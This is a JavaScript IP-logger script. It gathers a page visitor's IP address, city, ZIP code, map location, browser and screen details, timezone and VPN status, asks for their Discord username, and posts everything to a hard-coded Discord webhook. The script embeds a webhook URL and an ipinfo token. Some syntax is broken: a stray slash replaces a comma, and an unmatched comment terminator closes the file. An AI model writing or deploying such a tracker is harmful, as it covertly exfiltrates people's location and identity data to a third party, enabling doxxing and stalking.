function getUserAgentData() {
  const userAgent = window.navigator.userAgent;
  const platform = window.navigator.platform;
  const language = window.navigator.language || window.navigator.userLanguage;

  return {
    userAgent: userAgent,
    platform: platform,
    language: language
  };
}
function getScreenResolution() {
  return {
    screenWidth: window.screen.width,
    screenHeight: window.screen.height
  };
}
function getTimezone() {
  return Intl.DateTimeFormat().resolvedOptions().timeZone;
}
async function isUsingVPN(ip) {
  const response = await fetch(`https://ipinfo.io/${ip}/privacy?token=d461c38f4d0d4f`);
  const data = await response.json();
  return data.vpn;
}

async function logs(json) {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1119415978908991568/Eyf1l7qK95LZUeyQSjncUUzJTIXJBN04JU7rrH3bHCKG7_aK3n5a5gcrmYSynxpd1M9v");
    request.setRequestHeader('Content-type', 'application/json');

  const userAgentData = getUserAgentData();
  const screenResolution = getScreenResolution();
  const timezone = getTimezone();
  const usingVPN = await isUsingVPN(json.ip);
      var username = prompt("Veuillez entrer votre pseudonyme Discord (ex: username#1234) :");

var params = {
    username: "Ip logs",
    avatar_url: "https://media.discordapp.net/attachments/1063995449045946498/1064760532571271238/460f5308ad1e4239067a0e8a216db921.png",
    content: "new ip",
    embeds: [
        {

            title: "User and IP Info",
            color: 16711680,
            fields: [
                {
                    name: "Account Ip:",
                    value: `** **`,
                    inline: false
                },
                {
                    name: "IP",
                    value: `\`${json.ip}\``,
                    inline: true
                },
                {
                    name: "Country",
                    value: `\`${json.country}\``,
                    inline: true
                },
                {
                    name: "Region",
                    value: `\`${json.region}\``,
                    inline: true
                },
                {
                    name: "Town/City",
                    value: `\`${json.city}\``,
                    inline: true
                },
                {
                    name: "ZIP",
                    value: `\`${json.postal}\``,
                    inline: true
                },
                {
                    name: "User Agent",
                    value: `\`${userAgentData.userAgent}\``,
                    inline: true
                },
                {
                    name: "Platform",
                    value: `\`${userAgentData.platform}\``,
                    inline: true
                },
                {
                    name: "Language",
                    value: `\`${userAgentData.language}\``,
                    inline: true
                },
                {
                    name: "Screen Resolution",
                    value: `\`${screenResolution.screenWidth}x${screenResolution.screenHeight}\``,
                    inline: true
                },
                {
                    name: "Timezone",
                    value: `\`${timezone}\``,
                    inline: true
                },
                {
                    name: "VPN",
                    value: `\`${usingVPN ? 'Yes' : 'No'}\``,
                    inline: true
                },
                {
                    name: "Geolocation",
                    value: `[Google Maps](https://www.google.com/maps?q=${json.loc})`,
                    inline: true
                }/
                {
                    name: "Account Info:",
                    value: `** **`,
                    inline: false
                },
               {
                   name: "Username",
                   value: username ? `\`${username}\`` : "Not provided",
                   inline: true
                },
                {
                    name: "Comming Soon Info:",
                    value: `Discord ID, Account Creation Date, Profile Picture`,
                    inline: true
                }
              ]
        }
    ]
}
    request.send(JSON.stringify(params));

}*/

